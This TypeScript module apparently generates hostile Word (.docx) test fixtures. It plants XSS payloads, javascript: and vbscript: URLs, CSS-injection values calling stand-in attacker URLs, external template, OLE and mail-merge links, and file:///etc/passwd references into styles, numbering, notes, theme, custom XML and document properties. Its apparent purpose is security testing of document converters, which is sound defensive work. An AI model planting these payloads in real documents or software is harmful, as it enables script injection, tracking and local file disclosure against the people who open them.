// Hostile slots in the other parts: linked files, embedded HTML, notes, styles, numbering, custom XML, the theme and the properties.
import { W, REL, A, XML, esc, run, htmlPayload, jsUrl, evilUrl, cssFont } from "./hostile-payloads";
import type { Ctx } from "./hostile-docx";

/** external: a picture that is only linked, a template to attach, a linked sub-document */
export function externalSlot(c: Ctx): void {
  const { on, body, p, nextRid, para, pic } = c;
  if (on.has("external")) {
    const link = nextRid();
    p.rels.push(`<Relationship Id="${link}" Type="${REL}/image" Target="${evilUrl("external", "linked-picture")}.png" TargetMode="External"/>`);
    body.push(para(pic({ rid: link, link, id: c.docPrId++, descr: "linked picture" })));
    const link2 = nextRid();
    p.rels.push(`<Relationship Id="${link2}" Type="${REL}/image" Target="file:///etc/passwd" TargetMode="External"/>`);
    body.push(para(pic({ rid: link2, link: link2, id: c.docPrId++, descr: "linked file picture" })));
    const tpl = nextRid();
    p.rels.push(`<Relationship Id="${tpl}" Type="${REL}/attachedTemplate" Target="${evilUrl("external", "template")}.dotm" TargetMode="External"/>`);
    c.settingsExtra += `<w:attachedTemplate r:id="${tpl}"/>`;
    const frame = nextRid();
    p.rels.push(`<Relationship Id="${frame}" Type="${REL}/frame" Target="${evilUrl("external", "frame")}.html" TargetMode="External"/>`);
    c.settingsExtra += `<w:mailMerge><w:mainDocumentType w:val="formLetters"/><w:dataType w:val="textFile"/><w:connectString w:val="Provider=${esc(evilUrl("external", "connect"))}"/><w:query w:val="SELECT * FROM x"/><w:dataSource r:id="${frame}"/></w:mailMerge>`;
    const ole = nextRid();
    p.rels.push(`<Relationship Id="${ole}" Type="${REL}/oleObject" Target="${evilUrl("external", "ole")}.bin" TargetMode="External"/>`);
    body.push(para(`<w:r><w:object><v:shape xmlns:v="urn:schemas-microsoft-com:vml" id="ole1" style="width:50pt;height:50pt"><v:imagedata r:id="${link}"/></v:shape><o:OLEObject xmlns:o="urn:schemas-microsoft-com:office:office" Type="Link" ProgID="Word.Document.12" ShapeID="ole1" DrawAspect="Content" r:id="${ole}"/></w:object></w:r>`));
    body.push(para(`<w:r><w:pict><v:shape xmlns:v="urn:schemas-microsoft-com:vml" id="vml1" style="width:50pt;height:50pt"><v:imagedata r:id="${link2}"/></v:shape></w:pict></w:r>`));
  }
}

/** altchunk: embedded HTML, and an altChunk that is only a link */
export function altchunkSlot(c: Ctx): void {
  const { on, body, p, nextRid, addPart } = c;
  if (on.has("altchunk")) {
    const html = `<html><head><title>${htmlPayload("altchunk:title")}</title><meta http-equiv="refresh" content="0;url=javascript:${run("altchunk:refresh")}"><base href="${evilUrl("altchunk", "base")}/"><link rel="stylesheet" href="${evilUrl("altchunk", "stylesheet")}.css"><style>@import url(${evilUrl("altchunk", "style-import")}.css); body{background:url(${evilUrl("altchunk", "style-bg")}.png)}</style><script>${run("altchunk:head-script")}</script><script src="${evilUrl("altchunk", "script-src")}.js"></script></head>` +
      `<body onload="${run("altchunk:body-onload")}"><p>chunk paragraph</p><p onclick="${run("altchunk:onclick")}">click</p>${htmlPayload("altchunk:body")}` +
      `<a href="javascript:${run("altchunk:a")}">chunk link</a><a href="vbscript:x">vb</a><iframe src="javascript:${run("altchunk:iframe")}"></iframe><iframe src="${evilUrl("altchunk", "iframe-http")}/"></iframe>` +
      `<object data="${evilUrl("altchunk", "object")}.swf"></object><embed src="${evilUrl("altchunk", "embed")}.swf"><img src="${evilUrl("altchunk", "img")}.png"><img src="file:///etc/passwd">` +
      `<form action="${evilUrl("altchunk", "form")}"><input name="x" value="y"><button formaction="javascript:${run("altchunk:formaction")}">go</button></form>` +
      `<svg><script>${run("altchunk:svg-script")}</script><a xlink:href="javascript:${run("altchunk:svg-a")}"><text>t</text></a></svg><math><maction actiontype="statusline#" xlink:href="javascript:${run("altchunk:math")}">m</maction></math>` +
      `<div style="background:url(${evilUrl("altchunk", "inline-style")}.png);width:expression(${run("altchunk:expression")})">styled</div><table background="${evilUrl("altchunk", "table-bg")}.png"><tr><td>cell</td></tr></table><video src="${evilUrl("altchunk", "video")}.mp4" poster="${evilUrl("altchunk", "poster")}.png"></video>` +
      `</body></html>`;
    const id = nextRid();
    addPart("word/afchunk1.html", html, "text/html");
    p.rels.push(`<Relationship Id="${id}" Type="${REL}/aFChunk" Target="afchunk1.html"/>`);
    body.push(`<w:altChunk r:id="${id}"/>`);
    const id2 = nextRid();
    p.rels.push(`<Relationship Id="${id2}" Type="${REL}/aFChunk" Target="${evilUrl("altchunk", "linked-chunk")}.html" TargetMode="External"/>`);
    body.push(`<w:altChunk r:id="${id2}"/>`);
    // the same chunk as an .mht web archive and as RTF
    const id3 = nextRid();
    addPart("word/afchunk2.mht", `MIME-Version: 1.0\r\nContent-Type: multipart/related; boundary="b"\r\n\r\n--b\r\nContent-Type: text/html\r\n\r\n<html><body><script>${run("altchunk:mht")}</script><p>mht text</p></body></html>\r\n--b--\r\n`, "message/rfc822");
    p.rels.push(`<Relationship Id="${id3}" Type="${REL}/aFChunk" Target="afchunk2.mht"/>`);
    body.push(`<w:altChunk r:id="${id3}"/>`);
  }
}

/** notes: comments, footnotes and endnotes */
export function notesSlot(c: Ctx): void {
  const { on, body, p, t, para, addPart } = c;
  let notesRefs = "";
  if (on.has("notes")) {
    addPart(
      "word/comments.xml",
      `${XML}<w:comments xmlns:w="${W}"><w:comment w:id="0" w:author="${esc(htmlPayload("notes:comment-author"))}" w:initials="${esc(`"><script>${run("notes:initials")}</script>`)}" w:date="2024-01-01T00:00:00Z">${para(t(htmlPayload("notes:comment")))}</w:comment></w:comments>`,
      "application/vnd.openxmlformats-officedocument.wordprocessingml.comments+xml",
    );
    p.rels.push(`<Relationship Id="rId91" Type="${REL}/comments" Target="comments.xml"/>`);
    const sep = (tag: string) =>
      `<w:${tag} w:type="separator" w:id="-1"><w:p><w:r><w:separator/></w:r></w:p></w:${tag}><w:${tag} w:type="continuationSeparator" w:id="0"><w:p><w:r><w:continuationSeparator/></w:r></w:p></w:${tag}>`;
    addPart("word/footnotes.xml", `${XML}<w:footnotes xmlns:w="${W}">${sep("footnote")}<w:footnote w:id="1">${para(t(htmlPayload("notes:footnote")))}</w:footnote></w:footnotes>`, "application/vnd.openxmlformats-officedocument.wordprocessingml.footnotes+xml");
    p.rels.push(`<Relationship Id="rId92" Type="${REL}/footnotes" Target="footnotes.xml"/>`);
    addPart("word/endnotes.xml", `${XML}<w:endnotes xmlns:w="${W}">${sep("endnote")}<w:endnote w:id="1">${para(t(htmlPayload("notes:endnote")))}</w:endnote></w:endnotes>`, "application/vnd.openxmlformats-officedocument.wordprocessingml.endnotes+xml");
    p.rels.push(`<Relationship Id="rId93" Type="${REL}/endnotes" Target="endnotes.xml"/>`);
    notesRefs = para(
      `<w:commentRangeStart w:id="0"/>${t("commented text")}<w:commentRangeEnd w:id="0"/><w:r><w:commentReference w:id="0"/></w:r>` +
        `<w:r><w:footnoteReference w:id="1"/></w:r><w:r><w:endnoteReference w:id="1"/></w:r>`,
    );
    body.push(notesRefs);
  }
}

/** styles, fonts, colours: names that are HTML, and values that try to get out of a CSS declaration */
export function stylesSlot(c: Ctx): void {
  const { on, body, p, t, para, addPart } = c;
  if (on.has("styles")) {
    const style = (type: string, id: string, name: string, extra = "") => `<w:style w:type="${type}" w:styleId="${esc(id)}"><w:name w:val="${esc(name)}"/>${extra}</w:style>`;
    c.stylesXml =
      style("paragraph", `Evil1`, htmlPayload("styles:paragraph-name"), `<w:basedOn w:val="Normal"/><w:qFormat/><w:rPr><w:rFonts w:ascii="${esc(cssFont("styles-ascii"))}" w:hAnsi="${esc(cssFont("styles-hansi"))}"/><w:color w:val="${esc(`red;background:url(${evilUrl("styles", "color")})`)}"/><w:sz w:val="${esc(`22;background:url(${evilUrl("styles", "size")})`)}"/><w:highlight w:val="${esc(`yellow;background:url(${evilUrl("styles", "highlight")})`)}"/><w:shd w:val="clear" w:color="auto" w:fill="${esc(`FFFF00;background:url(${evilUrl("styles", "shd")})`)}"/></w:rPr>`) +
      style("character", `Evil2"onmouseover="${run("styles:id-attr")}`, `"><script>${run("styles:character-name")}</script>`, `<w:rPr><w:rFonts w:ascii="${esc(`"}</style><script>${run("styles:font-script")}</script><style>{`)}"/></w:rPr>`) +
      style("table", `Evil3`, htmlPayload("styles:table-name"), `<w:tblPr/>`) +
      style("numbering", `Evil4`, htmlPayload("styles:list-name")) +
      style("paragraph", `Evil5`, `Heading 1; background: url(${evilUrl("styles", "name-css")})`, `<w:basedOn w:val="Normal"/><w:pPr><w:outlineLvl w:val="0"/></w:pPr>`);
    body.push(para(t("styled text one"), `<w:pStyle w:val="Evil1"/>`));
    body.push(para(`<w:r><w:rPr><w:rStyle w:val="Evil2&quot;onmouseover=&quot;${esc(run("styles:id-attr"))}"/></w:rPr><w:t>styled text two</w:t></w:r>`));
    body.push(para(t("styled text three"), `<w:pStyle w:val="Evil5"/>`));
    const font = (id: string) => cssFont(id);
    body.push(
      para(
        `<w:r><w:rPr><w:rFonts w:ascii="${esc(font("run-font-a"))}" w:hAnsi="${esc(`</style><img src=x onerror=${run("styles:run-font-html")}>`)}" w:cs="${esc(`"}body{background:url(${evilUrl("styles", "run-font-cs")})}.x{font-family:"`)}" w:eastAsia="${esc(`\\22 ; background:url(${evilUrl("styles", "run-font-ea")})`)}"/><w:color w:val="${esc(`FF0000;background:url(${evilUrl("styles", "run-color")})`)}"/><w:shd w:val="clear" w:color="auto" w:fill="${esc(`0000FF" onmouseover="${run("styles:run-shd")}`)}"/><w:highlight w:val="${esc(`green;background:url(${evilUrl("styles", "run-highlight")})`)}"/><w:sz w:val="${esc(`24;background:url(${evilUrl("styles", "run-size")})`)}"/></w:rPr><w:t>font text</w:t></w:r>`,
        `<w:shd w:val="clear" w:color="auto" w:fill="${esc(`FFFF00;background:url(${evilUrl("styles", "para-shd")})`)}"/><w:pBdr><w:top w:val="single" w:sz="4" w:color="${esc(`000000;background:url(${evilUrl("styles", "border")})`)}"/></w:pBdr><w:jc w:val="${esc(`left;background:url(${evilUrl("styles", "jc")})`)}"/>`,
      ),
    );
    // a table with a cell shading and a width that try the same
    body.push(
      `<w:tbl><w:tblPr><w:tblW w:w="${esc(`5000;background:url(${evilUrl("styles", "tblw")})`)}" w:type="dxa"/></w:tblPr><w:tblGrid><w:gridCol w:w="4000"/></w:tblGrid><w:tr><w:tc><w:tcPr><w:shd w:val="clear" w:color="auto" w:fill="${esc(`FF00FF;background:url(${evilUrl("styles", "cell-shd")})`)}"/></w:tcPr>${para(t("shaded cell"))}</w:tc></w:tr></w:tbl>`,
    );
    addPart(
      "word/fontTable.xml",
      `${XML}<w:fonts xmlns:w="${W}"><w:font w:name="${esc(htmlPayload("styles:font-table"))}"><w:altName w:val="${esc(cssFont("font-alt"))}"/><w:panose1 w:val="020B0604020202020204"/><w:charset w:val="00"/><w:family w:val="swiss"/><w:pitch w:val="variable"/></w:font></w:fonts>`,
      "application/vnd.openxmlformats-officedocument.wordprocessingml.fontTable+xml",
    );
    p.rels.push(`<Relationship Id="rId94" Type="${REL}/fontTable" Target="fontTable.xml"/>`);
  }
}

/** numbering: list text and names */
export function numberingSlot(c: Ctx): void {
  const { on, body, p, t, para, addPart, cc } = c;
  if (on.has("numbering") || on.has("colours")) {
    const labelColours = on.has("colours") ? `<w:color w:val="${cc("list-label-color")}"/><w:highlight w:val="${cc("list-label-highlight")}"/><w:shd w:val="clear" w:color="auto" w:fill="${cc("list-label-shd")}"/>` : "";
    addPart(
      "word/numbering.xml",
      `${XML}<w:numbering xmlns:w="${W}"><w:abstractNum w:abstractNumId="0"><w:multiLevelType w:val="hybridMultilevel"/><w:name w:val="${esc(htmlPayload("numbering:name"))}"/>` +
        `<w:lvl w:ilvl="0"><w:start w:val="1"/><w:numFmt w:val="decimal"/><w:lvlText w:val="${esc(`%1.${htmlPayload("numbering:lvltext")}`)}"/><w:lvlJc w:val="left"/><w:rPr><w:rFonts w:ascii="${esc(cssFont("numbering-font"))}" w:hAnsi="Symbol"/>${labelColours}</w:rPr></w:lvl>` +
        `<w:lvl w:ilvl="1"><w:start w:val="1"/><w:numFmt w:val="bullet"/><w:lvlText w:val="${esc(`<script>${run("numbering:bullet")}</script>`)}"/><w:lvlJc w:val="left"/></w:lvl>` +
        `<w:lvl w:ilvl="2"><w:start w:val="1"/><w:numFmt w:val="custom"/><w:lvlText w:val="${esc(`\\0022 ; background:url(${evilUrl("numbering", "lvltext-css")})`)}"/><w:lvlJc w:val="left"/></w:lvl>` +
        `</w:abstractNum><w:num w:numId="1"><w:abstractNumId w:val="0"/></w:num></w:numbering>`,
      "application/vnd.openxmlformats-officedocument.wordprocessingml.numbering+xml",
    );
    p.rels.push(`<Relationship Id="rId95" Type="${REL}/numbering" Target="numbering.xml"/>`);
    for (const lvl of [0, 1, 2]) body.push(para(t(`list item level ${lvl}`), `<w:numPr><w:ilvl w:val="${lvl}"/><w:numId w:val="1"/></w:numPr>`));
  }
}

/** custom XML: a part with script, bound to a content control */
export function customxmlSlot(c: Ctx): void {
  const { on, body, p, t, para, addPart } = c;
  if (on.has("customxml")) {
    addPart("customXml/item1.xml", `${XML}<root xmlns="urn:hostile"><value>${esc(htmlPayload("customxml:value"))}</value><script>${run("customxml:element")}</script><![CDATA[<script>${run("customxml:cdata")}</script>]]></root>`);
    addPart("customXml/itemProps1.xml", `${XML}<ds:datastoreItem ds:itemID="{11111111-2222-3333-4444-555555555555}" xmlns:ds="http://schemas.openxmlformats.org/officeDocument/2006/customXml"><ds:schemaRefs><ds:schemaRef ds:uri="urn:hostile"/></ds:schemaRefs></ds:datastoreItem>`, "application/vnd.openxmlformats-officedocument.customXmlProperties+xml");
    p.files.push([`customXml/_rels/item1.xml.rels`, `${XML}<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="${REL}/customXmlProps" Target="itemProps1.xml"/></Relationships>`]);
    p.rels.push(`<Relationship Id="rId96" Type="${REL}/customXml" Target="../customXml/item1.xml"/>`);
    body.push(
      `<w:sdt><w:sdtPr><w:alias w:val="bound"/><w:id w:val="4243"/><w:dataBinding w:prefixMappings="xmlns:h='urn:hostile'" w:xpath="/h:root[1]/h:value[1]" w:storeItemID="{11111111-2222-3333-4444-555555555555}"/><w:text/></w:sdtPr><w:sdtContent>${para(t(htmlPayload("customxml:bound-cached")))}</w:sdtContent></w:sdt>`,
    );
  }
}

/** theme: font names, scheme names */
export function themeSlot(c: Ctx): void {
  const { on, body, p, para, addPart, cc } = c;
  let themeFonts = "";
  if (on.has("theme") || on.has("colours")) {
    // The colours slot makes every colour of the scheme (and of its format styles) a hostile one.
    const tc = (name: string, valid: string) => (on.has("colours") ? cc(`theme-${name}`) : valid);
    const THEME = `${XML}<a:theme xmlns:a="${A}" name="${esc(htmlPayload("theme:name"))}"><a:themeElements><a:clrScheme name="${esc(htmlPayload("theme:colors"))}"><a:dk1><a:sysClr val="windowText" lastClr="${tc("dk1", "000000")}"/></a:dk1><a:lt1><a:sysClr val="window" lastClr="${tc("lt1", "FFFFFF")}"/></a:lt1><a:dk2><a:srgbClr val="${tc("dk2", "44546A")}"/></a:dk2><a:lt2><a:srgbClr val="${tc("lt2", "E7E6E6")}"/></a:lt2><a:accent1><a:srgbClr val="${tc("accent1", "4472C4")}"/></a:accent1><a:accent2><a:srgbClr val="${tc("accent2", "ED7D31")}"/></a:accent2><a:accent3><a:srgbClr val="${tc("accent3", "A5A5A5")}"/></a:accent3><a:accent4><a:srgbClr val="${tc("accent4", "FFC000")}"/></a:accent4><a:accent5><a:srgbClr val="${tc("accent5", "5B9BD5")}"/></a:accent5><a:accent6><a:srgbClr val="${tc("accent6", "70AD47")}"/></a:accent6><a:hlink><a:srgbClr val="${tc("hlink", "0563C1")}"/></a:hlink><a:folHlink><a:srgbClr val="${tc("folHlink", "954F72")}"/></a:folHlink></a:clrScheme>` +
      `<a:fontScheme name="${esc(htmlPayload("theme:fonts"))}"><a:majorFont><a:latin typeface="${esc(htmlPayload("theme:major"))}"/><a:ea typeface="${esc(cssFont("theme-major-ea"))}"/><a:cs typeface=""/></a:majorFont><a:minorFont><a:latin typeface="${esc(cssFont("theme-minor"))}"/><a:ea typeface=""/><a:cs typeface=""/></a:minorFont></a:fontScheme>` +
      `<a:fmtScheme name="${esc(htmlPayload("theme:format"))}"><a:fillStyleLst><a:solidFill><a:schemeClr val="phClr"/></a:solidFill><a:solidFill><a:srgbClr val="${tc("fill-style", "FFFFFF")}"/></a:solidFill></a:fillStyleLst><a:lnStyleLst><a:ln w="6350"><a:solidFill><a:srgbClr val="${tc("line-style", "000000")}"/></a:solidFill></a:ln><a:ln w="12700"/><a:ln w="19050"/></a:lnStyleLst></a:fmtScheme></a:themeElements></a:theme>`;
    addPart("word/theme/theme1.xml", THEME, "application/vnd.openxmlformats-officedocument.theme+xml");
    p.rels.push(`<Relationship Id="rId97" Type="${REL}/theme" Target="theme/theme1.xml"/>`);
    body.push(para(`<w:r><w:rPr><w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/></w:rPr><w:t>theme major font</w:t></w:r>`));
    body.push(para(`<w:r><w:rPr><w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/></w:rPr><w:t>theme minor font</w:t></w:r>`));
    themeFonts = "x";
  }
  void themeFonts;
}

/** document properties: title, author, subject, keywords, description, company, custom */
export function propsSlot(c: Ctx): void {
  const { on, body, p, t, para, addPart } = c;
  if (on.has("props")) {
    addPart(
      "docProps/core.xml",
      `${XML}<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">` +
        `<dc:title>${esc(htmlPayload("props:title"))}</dc:title><dc:subject>${esc(htmlPayload("props:subject"))}</dc:subject><dc:creator>${esc(htmlPayload("props:author"))}</dc:creator><cp:keywords>${esc(htmlPayload("props:keywords"))}</cp:keywords><dc:description>${esc(htmlPayload("props:description"))}</dc:description><cp:lastModifiedBy>${esc(htmlPayload("props:last-modified-by"))}</cp:lastModifiedBy><cp:category>${esc(htmlPayload("props:category"))}</cp:category><dc:language>${esc(htmlPayload("props:language"))}</dc:language></cp:coreProperties>`,
      "application/vnd.openxmlformats-package.core-properties+xml",
    );
    p.rootRels.push(`<Relationship Id="rIdc" Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties" Target="docProps/core.xml"/>`);
    addPart(
      "docProps/app.xml",
      `${XML}<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties"><Application>${esc(htmlPayload("props:application"))}</Application><Company>${esc(htmlPayload("props:company"))}</Company><Manager>${esc(htmlPayload("props:manager"))}</Manager><Template>${esc(htmlPayload("props:template"))}</Template><HyperlinkBase>${esc(jsUrl("props:hyperlink-base"))}</HyperlinkBase></Properties>`,
      "application/vnd.openxmlformats-officedocument.extended-properties+xml",
    );
    p.rootRels.push(`<Relationship Id="rIda" Type="${REL}/extended-properties" Target="docProps/app.xml"/>`);
    addPart(
      "docProps/custom.xml",
      `${XML}<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/custom-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes"><property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="2" name="${esc(htmlPayload("props:custom-name"))}"><vt:lpwstr>${esc(htmlPayload("props:custom-value"))}</vt:lpwstr></property><property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="x&quot; onmouseover=&quot;${esc(run("props:custom-attr"))}"><vt:lpwstr>v</vt:lpwstr></property></Properties>`,
      "application/vnd.openxmlformats-officedocument.custom-properties+xml",
    );
    p.rootRels.push(`<Relationship Id="rIdu" Type="${REL}/custom-properties" Target="docProps/custom.xml"/>`);
    // a field that shows the title in the text
    body.push(para(`<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> TITLE </w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r>${t(htmlPayload("props:title-field"))}<w:r><w:fldChar w:fldCharType="end"/></w:r>`));
    body.push(para(`<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> AUTHOR </w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r>${t("author field")}<w:r><w:fldChar w:fldCharType="end"/></w:r>`));
  }
}
